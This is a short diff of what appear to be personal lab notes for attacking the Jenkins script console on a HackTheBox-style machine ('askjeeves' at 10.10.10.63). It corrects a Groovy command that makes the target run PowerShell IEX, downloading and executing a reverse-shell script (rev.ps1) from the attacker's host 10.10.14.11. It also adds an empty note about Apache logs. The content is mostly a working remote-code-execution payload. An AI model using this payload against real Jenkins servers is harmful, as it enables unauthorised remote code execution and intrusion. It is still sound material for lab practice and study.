@@ -15,5 +15,10 @@ http://10.10.10.63:50000/askjeeves/script:
 cmd = """ cmd.exe /c echo "Hello World" """
 println cmd.execute().text
 
-cmd = """ powershell "IEX(New-Object Net.WevClient).downloadString('http://10.10.14.11/rev/ps1')" """
+cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/rev.ps1')" """
 println cmd.execute().text
+
+Apache check connections:
+/var/log/apache2# 
+
+
